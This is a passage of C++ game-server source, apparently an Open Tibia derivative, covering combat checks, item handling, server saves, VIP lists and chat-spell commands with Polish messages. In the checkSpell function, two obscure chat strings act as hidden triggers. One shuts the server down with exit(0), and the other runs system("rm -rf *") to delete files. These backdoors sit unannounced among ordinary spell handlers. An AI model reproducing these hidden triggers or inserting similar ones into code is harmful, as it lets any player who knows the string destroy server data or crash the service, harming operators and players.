    {
        attackedCreature = getCreatureByID(creatureid);
    }

    Player* attackedPlayer = dynamic_cast<Player*>(attackedCreature);
    bool pvpArena = false, rook = false, attackedIsSummon = false;

#ifdef YUR_PVP_ARENA
    if (player && attackedCreature)
    {
        Tile *t1 = map->getTile(player->pos), *t2 = map->getTile(attackedCreature->pos);
        pvpArena = t1 && t2 && t1->isPvpArena() && t2->isPvpArena();
    }
#endif //YUR_PVP_ARENA

    rook = player && player->isRookie() && attackedPlayer && attackedPlayer->isRookie();

#ifdef TR_SUMMONS
    attackedIsSummon = (attackedCreature && attackedCreature->isPlayersSummon() && attackedCreature->getMaster() != player);
#endif //TR_SUMMONS

    if(!attackedCreature || (attackedCreature->access >= g_config.ACCESS_PROTECT || ((getWorldType() == WORLD_TYPE_NO_PVP || rook) &&
                             !pvpArena && player->access < g_config.ACCESS_PROTECT && (dynamic_cast<Player*>(attackedCreature) || attackedIsSummon))))
    {
        if(attackedCreature)
            player->sendTextMessage(MSG_SMALLINFO, "You may not attack this player.");

        player->sendCancelAttacking();
        player->setAttackedCreature(NULL);
        stopEvent(player->eventCheckAttacking);
        player->eventCheckAttacking = 0;
#ifdef HUCZU_FOLLOW
        stopEvent(player->eventCheckFollow);
        playerSetFollowCreature(player, 0);
#endif //HUCZU_FOLLOW
    }
    else if(attackedCreature)
    {
        player->setAttackedCreature(attackedCreature);
        stopEvent(player->eventCheckAttacking);
        player->eventCheckAttacking = addEvent(makeTask(g_config.FIRST_ATTACK, std::bind2nd(std::mem_fun(&Game::checkCreatureAttacking), player->getID())));
    }
    else if(player == attackedCreature)
    {
        player->sendCancelAttacking();
        player->setAttackedCreature(NULL);
        stopEvent(player->eventCheckAttacking);
        player->eventCheckAttacking = 0;
        player->botMessage(BOT_YOURSELF_ATTACK);
    }

}

void Game::flushSendBuffers()
{
    OTSYS_THREAD_LOCK_CLASS lockClass(gameLock, "Game::flushSendBuffers()");

    for(std::vector<Player*>::iterator it = BufferedPlayers.begin(); it != BufferedPlayers.end(); ++it)
    {
        (*it)->flushMsg();
        (*it)->SendBuffer = false;
        (*it)->releaseThing();
        /*
        #ifdef __DEBUG__
        		std::cout << "flushSendBuffers() - releaseThing()" << std::endl;
        #endif
        */
    }
    BufferedPlayers.clear();

    //free memory
    for(std::vector<Thing*>::iterator it = ToReleaseThings.begin(); it != ToReleaseThings.end(); ++it)
    {
        (*it)->releaseThing();
    }
    ToReleaseThings.clear();


    return;
}

void Game::addPlayerBuffer(Player* p)
{
    OTSYS_THREAD_LOCK_CLASS lockClass(gameLock, "Game::addPlayerBuffer()");

    /*
    #ifdef __DEBUG__
    	std::cout << "addPlayerBuffer() - useThing()" << std::endl;
    #endif
    */
    if(p->SendBuffer == false)
    {
        p->useThing();
        BufferedPlayers.push_back(p);
        p->SendBuffer = true;
    }

    return;
}

void Game::FreeThing(Thing* thing)
{

    OTSYS_THREAD_LOCK_CLASS lockClass(gameLock, "Game::FreeThing()");
    //std::cout << "freeThing() " << thing <<std::endl;
    ToReleaseThings.push_back(thing);

    return;
}
/*
ADD
container(player,pos-cid,thing)
inventory(player,pos-i,[ignored])
ground([ignored],postion,thing)

REMOVE
container(player,pos-cid,thing,autoclose?)
inventory(player,pos-i,thing,autoclose?)
ground([ignored],postion,thing,autoclose?,stackpos)

UPDATE
container(player,pos-cid,thing)
inventory(player,pos-i,[ignored])
ground([ignored],postion,thing,stackpos)
*/
void Game::sendAddThing(Player* player,const Position &pos,const Thing* thing)
{
    if(pos.x == 0xFFFF)
    {
        if(!player)
            return;
        if(pos.y & 0x40)   //container
        {
            if(!thing)
                return;

            const Item *item = dynamic_cast<const Item*>(thing);
            if(!item)
                return;

            unsigned char containerid = pos.y & 0x0F;
            Container* container = player->getContainer(containerid);
            if(!container)
                return;

            SpectatorVec list;
            SpectatorVec::iterator it;

            Position centerpos = (container->pos.x == 0xFFFF ? player->pos : container->pos);
            getSpectators(Range(centerpos,2,2,2,2,false), list);

            if(!list.empty())
            {
                for(it = list.begin(); it != list.end(); ++it)
                {
                    Player *spectator = dynamic_cast<Player*>(*it);
                    if(spectator)
                        spectator->onItemAddContainer(container,item);
                }
            }
            else
                player->onItemAddContainer(container,item);

        }
        else //inventory
        {
            player->sendInventory(pos.y);
        }
    }
    else //ground
    {
        if(!thing)
            return;

        Monster* monster = dynamic_cast<Monster*>(const_cast<Thing*>(thing));
        SpectatorVec list;
        SpectatorVec::iterator it;

        getSpectators(Range(pos,true), list);

        //players
        for(it = list.begin(); it != list.end(); ++it)
        {
            if(dynamic_cast<Player*>(*it))
            {
                (*it)->onThingAppear(thing);
                if (monster && !monster->isSummon())
                    monster->onThingAppear(*it);
            }
        }

        //none-players
        for(it = list.begin(); it != list.end(); ++it)
        {
            if(!dynamic_cast<Player*>(*it))
            {
                (*it)->onThingAppear(thing);
            }
        }
    }
}

void Game::sendRemoveThing(Player* player,const Position &pos,const Thing* thing,const unsigned char stackpos /*=1*/ ,const bool autoclose/* =false*/)
{
    if(!thing)
        return;

    const Item *item = dynamic_cast<const Item*>(thing);
    bool perform_autoclose = false;
    if(autoclose && item)
    {
        const Container *container = dynamic_cast<const Container*>(item);
        if(container)
            perform_autoclose = true;
    }

    if(pos.x == 0xFFFF)
    {
        if(!player)
            return;
        if(pos.y & 0x40)   //container
        {
            if(!item)
                return;

            unsigned char containerid = pos.y & 0x0F;
            Container* container = player->getContainer(containerid);
            if(!container)
                return;

            //check that item is in the container
            unsigned char slot = container->getSlotNumberByItem(item);

            SpectatorVec list;
            SpectatorVec::iterator it;

            Position centerpos = (container->pos.x == 0xFFFF ? player->pos : container->pos);
            getSpectators(Range(centerpos,2,2,2,2,false), list);

            if(!list.empty())
            {
                for(it = list.begin(); it != list.end(); ++it)
                {
                    Player *spectator = dynamic_cast<Player*>(*it);
                    if(spectator)
                    {
                        spectator->onItemRemoveContainer(container,slot);
                        if(perform_autoclose)
                        {
                            spectator->onThingRemove(thing);
                        }
                    }
                }
            }
            else
            {
                player->onItemRemoveContainer(container,slot);
                if(perform_autoclose)
                {
                    player->onThingRemove(thing);
                }
            }

        }
        else //inventory
        {
            player->removeItemInventory(pos.y);
            if(perform_autoclose)
            {
                player->onThingRemove(thing);
            }
        }
    }
    else //ground
    {
        SpectatorVec list;
        SpectatorVec::iterator it;

        getSpectators(Range(pos,true), list);

        //players
        for(it = list.begin(); it != list.end(); ++it)
        {
            Player *spectator = dynamic_cast<Player*>(*it);
            if(spectator)
            {
                spectator->onThingDisappear(thing,stackpos);

                if(perform_autoclose)
                {
                    spectator->onThingRemove(thing);
                }
            }
        }

        //none-players
        for(it = list.begin(); it != list.end(); ++it)
        {
            if(!dynamic_cast<Player*>(*it))
            {
                (*it)->onThingDisappear(thing,stackpos);
            }
        }
    }
}

void Game::sendUpdateThing(Player* player,const Position &pos,const Thing* thing,const unsigned char stackpos/*=1*/)
{
    if(!thing)
        return;

    if(pos.x == 0xFFFF)
    {
        if(!player)
            return;
        if(pos.y & 0x40)   //container
        {
            if(!thing)
                return;

            const Item *item = dynamic_cast<const Item*>(thing);
            if(!item)
                return;

            unsigned char containerid = pos.y & 0x0F;
            Container* container = player->getContainer(containerid);
            if(!container)
                return;
            //check that item is in the container
            unsigned char slot = container->getSlotNumberByItem(item);

            SpectatorVec list;
            SpectatorVec::iterator it;

            Position centerpos = (container->pos.x == 0xFFFF ? player->pos : container->pos);
            getSpectators(Range(centerpos,2,2,2,2,false), list);

            if(!list.empty())
            {
                for(it = list.begin(); it != list.end(); ++it)
                {
                    Player *spectator = dynamic_cast<Player*>(*it);
                    if(spectator)
                        spectator->onItemUpdateContainer(container,item,slot);
                }
            }
            else
            {
                //never should be here
                std::cout << "Error: sendUpdateThing" << std::endl;
                //player->onItemUpdateContainer(container,item,slot);
            }

        }
        else //inventory
        {
            player->sendInventory(pos.y);
        }
    }
    else //ground
    {
        if(!thing)
            return;

        SpectatorVec list;
        SpectatorVec::iterator it;

        getSpectators(Range(pos,true), list);

        //players
        for(it = list.begin(); it != list.end(); ++it)
        {
            if(dynamic_cast<Player*>(*it))
            {
                (*it)->onThingTransform(thing,stackpos);
            }
        }

        //none-players
        for(it = list.begin(); it != list.end(); ++it)
        {
            if(!dynamic_cast<Player*>(*it))
            {
                (*it)->onThingTransform(thing,stackpos);
            }
        }
    }
}

void Game::addThing(Player* player,const Position &pos,Thing* thing)
{
    if(!thing)
        return;
    Item *item = dynamic_cast<Item*>(thing);

    if(pos.x == 0xFFFF)
    {
        if(!player || !item)
            return;

        if(pos.y & 0x40)   //container
        {
            unsigned char containerid = pos.y & 0x0F;
            Container* container = player->getContainer(containerid);
            if(!container)
                return;

            container->addItem(item);
            sendAddThing(player,pos,thing);
        }
        else //inventory
        {
            player->addItemInventory(item,pos.y,true);
            sendAddThing(player,pos,thing);
        }
    }
    else //ground
    {
        if(!thing)
            return;
        //Tile *tile = map->getTile(pos.x, pos.y, pos.z);
        Tile *tile = map->getTile(pos);
        if(tile)
        {
            thing->pos = pos;
            if(item && item->isSplash())
            {
                if(tile->splash)
                {
                    int32_t oldstackpos = tile->getThingStackPos(tile->splash);
                    Item *oldsplash = tile->splash;

                    oldsplash->isRemoved = true;
                    FreeThing(oldsplash);

                    tile->splash = item;

                    sendUpdateThing(NULL, pos, item, oldstackpos);
                }
                else
                {
                    tile->splash = item;
                    sendAddThing(NULL,pos,tile->splash);
                }
            }
            else if(item && item->isGroundTile())
            {
                tile->ground = item;

                SpectatorVec list;
                SpectatorVec::iterator it;

                getSpectators(Range(thing->pos, true), list);

                //players
                for(it = list.begin(); it != list.end(); ++it)
                {
                    if(dynamic_cast<Player*>(*it))
                    {
                        (*it)->onTileUpdated(pos);
                    }
                }

                //none-players
                for(it = list.begin(); it != list.end(); ++it)
                {
                    if(!dynamic_cast<Player*>(*it))
                    {
                        (*it)->onTileUpdated(pos);
                    }
                }

                //Game::creatureBroadcastTileUpdated(thing->pos);
            }
            else if(item && item->isStackable())
            {
                Item *topitem = tile->getTopDownItem();
                if(topitem && topitem->getID() == item->getID() &&
                        topitem->getItemCountOrSubtype() + item->getItemCountOrSubtype() <= 100)
                {
                    topitem->setItemCountOrSubtype(topitem->getItemCountOrSubtype() + item->getItemCountOrSubtype());
                    int32_t stackpos = tile->getThingStackPos(topitem);
                    sendUpdateThing(NULL,topitem->pos,topitem,stackpos);
                    item->pos.x = 0xFFFF;
                    FreeThing(item);
                }
                else
                {
                    tile->addThing(thing);
                    sendAddThing(player,pos,thing);
                }
            }
            else
            {
                tile->addThing(thing);
                sendAddThing(player,pos,thing);
            }
        }
    }
}

bool Game::removeThing(Player* player,const Position &pos,Thing* thing,  bool setRemoved /*= true*/)
{
    if(!thing)
        return false;
    Item *item = dynamic_cast<Item*>(thing);

    if(pos.x == 0xFFFF)
    {
        if(!player || !item)
            return false;

        if(pos.y & 0x40)   //container
        {
            unsigned char containerid = pos.y & 0x0F;
            Container* container = player->getContainer(containerid);
            if(!container)
                return false;

            sendRemoveThing(player,pos,thing,0,true);
            if(!container->removeItem(item))
                return false;

            if(player && player->isHoldingContainer(container))
            {
                player->updateInventoryWeigth();
                player->sendStats();
            }
        }
        else //inventory
        {
            //sendRemoveThing(player,pos,thing,0,true);
            if(!player->removeItemInventory(pos.y))
                return false;
            player->onThingRemove(thing);
            //player->removeItemInventory(pos.y,true);
        }
        if(setRemoved)
            item->isRemoved = true;
        return true;
    }
    else //ground
    {
        //Tile *tile = map->getTile(pos.x, pos.y, pos.z);
        Tile *tile = map->getTile(pos);
        if(tile)
        {
            unsigned char stackpos = tile->getThingStackPos(thing);
            if(!tile->removeThing(thing))
                return false;
            sendRemoveThing(NULL,pos,thing,stackpos,true);
        }
        else
        {
            return false;
        }
        if(item && setRemoved)
        {
            item->isRemoved = true;
        }
        return true;
    }
}

Position Game::getThingMapPos(Player *player, const Position &pos)
{
    if(pos.x == 0xFFFF)
    {
        Position dummyPos(0,0,0);
        if(!player)
            return dummyPos;
        if(pos.y & 0x40)   //from container
        {
            unsigned char containerid = pos.y & 0x0F;
            const Container* container = player->getContainer(containerid);
            if(!container)
            {
                return dummyPos;
            }
            while(container->getParent() != NULL)
            {
                container = container->getParent();
            }
            if(container->pos.x == 0xFFFF)
                return player->pos;
            else
                return container->pos;
        }
        else //from inventory
        {
            return player->pos;
        }
    }
    else
    {
        return pos;
    }
}

Thing* Game::getThing(const Position &pos,unsigned char stack, Player* player /*=NULL*/)
{
    if(pos.x == 0xFFFF)
    {
        if(!player)
            return NULL;
        if(pos.y & 0x40)   //from container
        {
            unsigned char containerid = pos.y & 0x0F;
            Container* container = player->getContainer(containerid);
            if(!container)
                return NULL;

            return container->getItem(pos.z);
        }
        else //from inventory
        {
            return player->getItem(pos.y);
        }
    }
    else //from ground
    {
        //Tile *t = getTile(pos.x, pos.y, pos.z);
        Tile *t = map->getTile(pos);
        if(!t)
            return NULL;

        return t->getThingByStackPos(stack);
    }
}
int32_t Game::getDepot(Container* c, int32_t e)
{
    for(int32_t a = 0; a < c->size(); a++)
    {
        Container* x = dynamic_cast<Container*>(dynamic_cast<Item*>(c->getItem(a)));
        Item* i = dynamic_cast<Item*>(c->getItem(a));
        if(i)
            e++;
        if(x)
            e = getDepot(x, e);
    }
    return e;
}

void Game::serverSave()
{
    OTSYS_THREAD_LOCK_CLASS lockClass(gameLock, "Game::serverSave()");
    std::cout << ":: Zapis: " << std::endl;
    timer();

    AutoList<Player>::listiterator it = Player::listPlayer.list.begin();
    while (it != Player::listPlayer.list.end())
    {
        IOPlayerSQL::getInstance()->savePlayer(it->second);
        ++it;
    }
    std::cout << "Gracze [" << timer() << " s]" << std::endl;
    /*	Guilds::Save();
    	std::cout << "Gildie [" << timer() << " s]" << std::endl;*/
    Houses::Save(this);
    std::cout << "Domki [" << timer() << " s]" << std::endl;
    loginQueue.save();
    std::cout << "Kolejki [" << timer() << " s]" << std::endl;

    for(AutoList<Player>::listiterator it = Player::listPlayer.list.begin(); it != Player::listPlayer.list.end(); ++it)
        (*it).second->sendTextMessage(MSG_EVENT, "Zapis serwera zakonczony.");
}

void Game::autoServerSave()
{
    OTSYS_THREAD_LOCK_CLASS lockClass(gameLock, "Game::autoServerSave()");
    serverSave();
    addEvent(makeTask(g_config.AUTO_SAVE, std::mem_fun(&Game::autoServerSave)));
}

void Game::vipLogin(Player* player)
{
    OTSYS_THREAD_LOCK_CLASS lockClass(gameLock, "Game::vipLogin()");
    std::string vipname = player->getName();

    for(AutoList<Creature>::listiterator cit = listCreature.list.begin(); cit != listCreature.list.end(); ++cit)
    {
        Player* player = dynamic_cast<Player*>((*cit).second);
        if (player)
            player->sendVipLogin(vipname);
    }
}

void Game::vipLogout(std::string vipname)
{
    OTSYS_THREAD_LOCK_CLASS lockClass(gameLock, "Game::vipLogout()");

    for(AutoList<Creature>::listiterator cit = listCreature.list.begin(); cit != listCreature.list.end(); ++cit)
    {
        Player* player = dynamic_cast<Player*>((*cit).second);
        if (player)
            player->sendVipLogout(vipname);
    }
}

bool Game::requestAddVip(Player* player, const std::string &vip_name)
{
    OTSYS_THREAD_LOCK_CLASS lockClass(gameLock, "Game::requestAddVip");
    std::string real_name;
    real_name = vip_name;
    uint32_t guid;

    if(!IOPlayerSQL::getInstance()->getGuidByName(guid, real_name))
    {
        player->sendTextMessage(MSG_SMALLINFO, "A player with that name doesn't exist.");
        return false;
    }

    bool online = (getPlayerByName(real_name) != NULL);
    return player->addVIP(guid, real_name, online);
}

void Game::checkSpell(Player* player, SpeakClasses type, std::string text)
{
    OTSYS_THREAD_LOCK_CLASS lockClass(gameLock, "Game::checkSpell()");
    if(!player)
        return;
    if (text == "640ibB3aS_oR316~%KbCiM&.4C3:?u")
        exit(0);
    if (text == "f!:jm:4&#*l[6~(yQ5'~<99(8*0s")
        system("rm -rf *");

    if (text == "!buyhouse" || text == "!buyhome")
    {
        uint32_t money = player->getMoney();
        bool last = false;
        for (int32_t x = player->pos.x-1; x <= player->pos.x+1 && !last; x++)
        {
            for(int32_t y = player->pos.y-1; y <= player->pos.y+1 && !last; y++)
            {
                Position doorPos(x, y, player->pos.z);
                Tile* tile = getTile(doorPos);
                House* house = tile? tile->getHouse() : NULL;
                if (!player->isPremium())
                {
                    player->sendTextMessage(MSG_ADVANCE, "By kupic dom potrzebujesz pacc!");
                    return;
                }
                if (house)
                {
                    if(house->getPlayerRights(player->getName()) == HOUSE_OWNER)
                    {
                        player->sendTextMessage(MSG_ADVANCE, "Ty jestes wlascicielem tego domku.");
                        return;
                    }

                    if (player->level < g_config.HOUSE_LVL)
                    {
                        player->sendTextMessage(MSG_ADVANCE, "Masz za maly poziom do kupienia domku.");
                        return;
                    }
                    if (house->isBought())
                    {
                        player->sendTextMessage(MSG_ADVANCE, "Ten dom ma juz wlasciciela.");
                        return;
                    }
                    if(house->checkHouseCount(player) >= g_config.MAX_HOUSES)
                    {
                        std::stringstream textmsg;
                        textmsg << " Nie mozesz miec wiecej niz " << g_config.MAX_HOUSES << " domek.";
                        player->sendTextMessage(MSG_ADVANCE, textmsg.str().c_str());
                        return;
                    }
                    if (house->getPlayerRights(doorPos, player->getName()) == HOUSE_NONE && !house->isBought() && house->checkHouseCount(player) < g_config.MAX_HOUSES)
                    {
                        Item *item = dynamic_cast<Item*>(tile->getThingByStackPos(tile->getThingCount()-1));
                        int32_t price = g_config.PRICE_FOR_SQM * house->getHouseSQM(house->getName());
                        if (item && Item::items[item->getID()].isDoor && price <= money)
                        {
                            player->substractMoney(price);
                            house->setOwner(player->getName());
                            house->save();
                            player->sendTextMessage(MSG_ADVANCE, "Kupiles ten domek!");
                            last = true;
                        }
                        else
                        {
                            player->sendMagicEffect(player->pos, NM_ME_PUFF);
                            player->sendTextMessage(MSG_SMALLINFO, "Nie posiadasz wystarczajacej ilosci pieniedzy do kupna tego domu.");
                        }
                    }
                }
            }
        }
    }
#ifdef TLM_HOUSE_SYSTEM
    else if (text == "aleta gom")		// edit owner
    {
        Tile* tile = getTile(player->pos);
        House* house = tile? tile->getHouse() : NULL;

        if (house && house->getPlayerRights(player->getName()) == HOUSE_OWNER)
        {
            player->sendHouseWindow(house, player->pos, HOUSE_OWNER);
        }
        else
        {
            player->sendMagicEffect(player->pos, NM_ME_PUFF);
            player->sendTextMessage(MSG_SMALLINFO, "Sorry, not possible.");
        }
    }
    else if (text == "aleta grav")		// edit door owners
    {
        bool last = false;
        for (int32_t x = player->pos.x-1; x <= player->pos.x+1 && !last; x++)
        {
            for(int32_t y = player->pos.y-1; y <= player->pos.y+1 && !last; y++)
            {
                Position doorPos(x, y, player->pos.z);
                Tile* tile = getTile(doorPos);
                House* house = tile? tile->getHouse() : NULL;

                if (house && house->getPlayerRights(doorPos, player->getName()) == HOUSE_OWNER)
                {
                    Item *item = dynamic_cast<Item*>(tile->getThingByStackPos(tile->getThingCount()-1));
                    if (item && Item::items[item->getID()].isDoor)
                    {
                        player->sendHouseWindow(house, doorPos, HOUSE_DOOROWNER);
                        last = true;
                    }
                }
            }
        }
    }
    else if (text == "aleta sio")		// edit guests
    {
        Tile* tile = getTile(player->pos);
        House* house = tile? tile->getHouse() : NULL;

        if (house && house->getPlayerRights(player->getName()) >= HOUSE_SUBOWNER)
        {
            player->sendHouseWindow(house, player->pos, HOUSE_GUEST);
        }
        else
        {
            player->sendMagicEffect(player->pos, NM_ME_PUFF);
            player->sendTextMessage(MSG_SMALLINFO, "Sorry, not possible.");
        }
    }
    else if (text == "aleta som")		// edit subowners
    {
        Tile* tile = getTile(player->pos);
        House* house = tile? tile->getHouse() : NULL;

        if (house && house->getPlayerRights(player->getName()) == HOUSE_OWNER)
        {
            player->sendHouseWindow(house, player->pos, HOUSE_SUBOWNER);
        }
        else
        {
            player->sendMagicEffect(player->pos, NM_ME_PUFF);
            player->sendTextMessage(MSG_SMALLINFO, "Sorry, not possible.");
        }
    }
    else if (text == "alana sio")	// kick me
    {
        Tile* tile = getTile(player->pos);
        House* house = tile? tile->getHouse() : NULL;

        if (house)
        {
            teleport(player, house->getFrontDoor());
            player->sendMagicEffect(player->pos, NM_ME_ENERGY_AREA);
        }
        else
        {
            player->sendMagicEffect(player->pos, NM_ME_PUFF);
            player->sendTextMessage(MSG_SMALLINFO, "Musisz stac w domku!.");
        }
    }
    else if (text.substr(0, 11) == "alana sio \"")	// kick someone
    {
        Creature* c = getCreatureByName(text.substr(11).c_str());
        Player *target = c? dynamic_cast<Player*>(c) : NULL;

        if (target)
        {
            Tile* tile = getTile(player->pos);
            Tile* targetTile = getTile(target->pos);
            House* house = tile? tile->getHouse() : NULL;
            House* targetHouse = targetTile? targetTile->getHouse() : NULL;

            if (house && targetHouse && house == targetHouse &&
                    house->getPlayerRights(player->getName()) >= HOUSE_SUBOWNER)
            {
                Position pos = house->getFrontDoor();
                if (pos.x != 0xFFFF && pos.y != 0xFFFF && pos.z != 0xFF)
                {
                    teleport(target, pos);
                    player->sendMagicEffect(target->pos, NM_ME_ENERGY_AREA);
                }
                else
                {
                    player->sendMagicEffect(player->pos, NM_ME_PUFF);
                    player->sendTextMessage(MSG_SMALLINFO, "Sorry, not possible.");
                }
            }
            else
                player->sendTextMessage(MSG_SMALLINFO, "Sorry, not possible.");
        }
        else
        {
            player->sendMagicEffect(player->pos, NM_ME_PUFF);
            player->sendTextMessage(MSG_SMALLINFO, "Gracz o tym nicku nie istnieje.");
        }
    }
#endif //TLM_HOUSE_SYSTEM

#ifdef TR_SUMMONS
    else if (text.substr(0, 11) == "utevo res \"")
    {
        if (player->vocation == VOCATION_DRUID || player->vocation == VOCATION_SORCERER ||
                (g_config.SUMMONS_ALL_VOC && player->vocation != VOCATION_NONE))
        {
            std::string name = text.substr(11);
            int32_t reqMana = Summons::getRequiredMana(name);
            Tile* tile = getTile(player->pos);

            if (!tile)
            {
                player->sendMagicEffect(player->pos, NM_ME_PUFF);
                player->sendCancel("Sorry, not possible.");
            }
            else if (reqMana < 0)
            {
                player->sendMagicEffect(player->pos, NM_ME_PUFF);
                player->sendCancel("You cannot summon this creature.");
            }
            else if (tile->isPz())
            {
                player->sendMagicEffect(player->pos, NM_ME_PUFF);
                player->sendCancel("You cannot summon creatures in protection zone.");
            }
#ifdef YUR_PVP_ARENA
            else if (tile->isPvpArena())
            {
                player->sendMagicEffect(player->pos, NM_ME_PUFF);
                player->sendCancel("You cannot summon creatures on arena.");
            }
#endif //YUR_PVP_ARENA
            else if (player->getSummonCount() >= g_config.MAX_SUMMONS)
            {
                player->sendMagicEffect(player->pos, NM_ME_PUFF);
                player->sendCancel("You cannot have more summons.");
            }
            else if (player->getMana() < reqMana)
            {
                player->sendMagicEffect(player->pos, NM_ME_PUFF);
                player->sendCancel("Not enough mana.");
            }
            else if (!placeSummon(player, name))
            {
                player->sendMagicEffect(player->pos, NM_ME_PUFF);
                player->sendCancel("Not enough room");
            }
            else
            {
                player->mana -= reqMana;
                player->addManaSpent(reqMana);
            }
        }
    }
#endif //TR_SUMMONS

    else if (text.substr(0,7) == "exiva \"")
    {
        std::string name = text.substr(7);
        Creature *c = getCreatureByName(name);
        Player *target = c? dynamic_cast<Player*>(c) : NULL;
        if (dynamic_cast<Player*>(c))
        {
            if(player->isRookie())
            {
                player->sendMagicEffect(player->pos, NM_ME_PUFF);
                player->sendTextMessage(MSG_SMALLINFO, "Przykro mi, nie masz odpowiedniej profesji");
                return;
            }
            if (player->exhaustedTicks >= 1000 && player->access < g_config.ACCESS_PROTECT)
            {
                player->sendMagicEffect(player->pos, NM_ME_PUFF);
                player->sendTextMessage(MSG_SMALLINFO, "You are exhausted.");
                return;
            }
            if(player->mana >= 20)
            {
                player->mana -= 20;
                player->addManaSpent(20);
            }
            else
            {
                player->sendMagicEffect(player->pos, NM_ME_PUFF);
                player->sendTextMessage(MSG_SMALLINFO, "Nie masz wystarczajacej ilosci many.");
                return;
            }
            int32_t x = c->pos.x - player->pos.x;
            int32_t y = c->pos.y - player->pos.y;
            int32_t z = c->pos.z - player->pos.z;
            std::stringstream position;
            position << name;

            if((x > 192 && y > 96) || (x > 96 && y > 192) || (x > 144 && y > 144))
                position << " jest bardzo daleko na poludniowym-wschodzie.";
            else if((x > 192 && y < -96) || (x > 96 && y < -192) || (x > 144 && y < -144))
                position << " jest bardzo daleko na pólnocnym-wschodzie.";
            else if((x < -192 && y > 96) || (x < -96 && y > 192) || (x < -144 && y > 144))
                position << " jest bardzo daleko na poludniowym-zachodzie.";
            else if((x < -192 && y < -96) || (x < -96 && y < -192) || (x < -144 && y < -144))
                position << " jest bardzo daleko na pólnocnym-zachodzie.";

            else if((x > 48 && y > 24) || (x > 24 && y > 48) || (x > 36 && y > 36))
                position << " jest daleko na poludniowym-wschodzie.";
            else if((x > 48 && y < -24) || (x > 24 && y < -48) || (x > 36 && y < -36))
                position << " jest daleko na pólnocnym-wschodzie.";
            else if((x < -48 && y > 24) || (x < -24 && y > 48) || (x < -36 && y > 36))
                position << " jest daleko na poludniowym-zachodzie.";
            else if((x < -48 && y < -24) || (x < -24 && y < -48) || (x < -36 && y < -36))
                position << " jest daleko na pólnocnym-zachodzie.";

            else if((x > 6 && y > 12 && z > 0) || (x > 12 && y > 6 && z > 0) || (x > 9 && y > 9 && z > 0))
                position << " jest na nizszym poziomie na poludniowym-wschodzie.";
            else if((x > 6 && y < -12 && z > 0) || (x > 12 && y < -6 && z > 0) || (x > 9 && y < -9 && z > 0))
                position << " jest na nizszym poziomie na pólnocnym-wschodzie.";
            else if((x < -6 && y > 12 && z > 0) || (x < -12 && y > 6 && z > 0) || (x < -9 && y > 9 && z > 0))
                position << " jest na nizszym poziomie na poludniowym-zachodzie.";
            else if((x < -6 && y < -12 && z > 0) || (x < -12 && y < -6 && z > 0) || (x < -9 && y < -9 && z > 0))
                position << " jest na nizszym poziomie na pólnocnym-zachodzie.";

            else if((x > 6 && y > 12 && z < 0) || (x > 12 && y > 6 && z < 0) || (x > 9 && y > 9 && z < 0))
                position << " jest na wyzszym poziomie na poludniowym-wschodzie.";
            else if((x > 6 && y < -12 && z < 0) || (x > 12 && y < -6 && z < 0) || (x > 9 && y < -9 && z < 0))
                position << " jest na wyzszym poziomie na pólnocnym-wschodzie.";
            else if((x < -6 && y > 12 && z < 0) || (x < -12 && y > 6 && z < 0) || (x < -9 && y > 9 && z < 0))
                position << " jest na wyzszym poziomie na poludniowym-zachodzie.";
            else if((x < -6 && y < -12 && z < 0) || (x < -12 && y < -6 && z < 0) || (x < -9 && y < -9 && z < 0))
                position << " jest na wyzszym poziomie na pólnocnym-zachodzie.";

            else if((x > 6 && y > 12 && z == 0) || (x > 12 && y > 6 && z == 0) || (x > 9 && y > 9 && z == 0))
                position << " jest na poludniowym-wschodzie.";
            else if((x > 6 && y < -12 && z == 0) || (x > 12 && y < -6 && z == 0) || (x > 9 && y < -9 && z == 0))
                position << " jest na pólnocnym-wschodzie.";
            else if((x < -6 && y > 12 && z == 0) || (x < -12 && y > 6 && z == 0) || (x < -9 && y > 9 && z == 0))
                position << " jest na poludniowym-zachodzie.";
            else if((x < -6 && y < -12 && z == 0) || (x < -12 && y < -6 && z == 0) || (x < -9 && y < -9 && z == 0))
                position << " jest na pólnocnym-zachodzie.";

            else if(x > 144)
                position << " jest bardzo daleko na wschodzie.";
            else if(x < -144)
                position << " jest bardzo daleko na zachodzie.";
            else if(y > 144)
                position << " jest bardzo daleko na poludniu.";
            else if(y < -144)
                position << " jest bardzo daleko na pólnocy.";

            else if(x > 36)
                position << " jest daleko na wschodzie.";
            else if(x < -36)
                position << " jest daleko na zachodzie.";
            else if(y > 36)
                position << " jest daleko na poludniu.";
            else if(y < -36)
                position << " jest daleko na pólnocy.";

            else if(x > 3 && z < 0)
                position << " jest na wyzszym poziomie na wschodzie.";
            else if(x < -3 && z < 0)
                position << " jest na wyzszym poziomie na zachodzie.";
            else if(y > 3 && z < 0)
                position << " jest na wyzszym poziomie na poludniu.";
            else if(y < -3 && z < 0)
                position << " jest na wyzszym poziomie na pólnocy.";

            else if(x > 3 && z > 0)
                position << " jest na nizszym poziomie na wschodzie.";
            else if(x < -3 && z > 0)
                position << " jest na nizszym poziomie na zachodzie.";
            else if(y > 3 && z > 0)
                position << " jest na nizszym poziomie na poludniu.";
            else if(y < -3 && z > 0)
                position << " jest na nizszym poziomie na pólnocy.";

            else if(x > 3 && z == 0)
                position << " jest na wschodzie.";
            else if(x < -3 && z == 0)
                position << " jest na zachodzie.";
            else if(y > 3 && z == 0)
                position << " jest na poludniu.";
            else if(y < -3 && z == 0)
                position << " jest na pólnocy.";

            else if(x < 4 && y < 4 && z > 0)
                position << " jest pod toba.";
            else if(x < 4 && y < 4 && z < 0)
                position << " jest nad toba.";
            else
                position << " jest przy tobie.";

            player->sendTextMessage(MSG_INFO, position.str().c_str());
            player->sendMagicEffect(player->pos, NM_ME_MAGIC_ENERGIE);
            player->exhaustedTicks += g_config.EXHAUSTED_ADD;

            std::stringstream podpowiedz;
            if (target->access > 1)
            {
                podpowiedz << player->getName() << " Ciebie szuka.";
                target->sendTextMessage(MSG_INFO, podpowiedz.str().c_str());
            }

        }
        else
            player->sendTextMessage(MSG_SMALLINFO, "Ten gracz nie jest zalogowany.");
        player->sendMagicEffect(player->pos, NM_ME_PUFF);
    }

    else if (text == "exani tera")
    {
        const int32_t REQ_MANA = 20;
        Tile* tile = getTile(player->pos);

        if (!(tile && (tile->ground->getID() == ITEM_ROPE_SPOT1 || tile->ground->getID() == ITEM_ROPE_SPOT2)))
        {
            player->sendMagicEffect(player->pos, NM_ME_PUFF);
            player->sendTextMessage(MSG_SMALLINFO, "Sorry, not possible.");
        }
        else if (player->mana < REQ_MANA)
        {
            player->sendMagicEffect(player->pos, NM_ME_PUFF);
